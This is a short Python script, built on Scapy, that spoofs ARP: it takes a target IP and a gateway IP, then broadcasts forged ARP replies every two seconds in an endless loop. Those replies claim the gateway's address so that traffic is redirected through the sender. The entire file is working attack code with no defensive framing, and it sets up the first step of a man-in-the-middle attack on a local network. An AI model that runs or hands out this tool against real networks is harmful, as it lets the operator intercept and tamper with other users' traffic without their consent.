from scapy.all import ARP, Ether, sendp
import argparse, time

ap = argparse.ArgumentParser()
ap.add_argument("target_ip")
ap.add_argument("gateway_ip")
ap.add_argument("-i", "--iface", default="eth0",
                help="Interface to send forged ARP replies")
args = ap.parse_args()

pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,
        psrc=args.gateway_ip, pdst=args.target_ip)

print(f"[*] Spoofing {args.gateway_ip} ➜ {args.target_ip} via {args.iface} (Ctrl-C to stop)")
while True:
    sendp(pkt, iface=args.iface, verbose=False)
    time.sleep(2)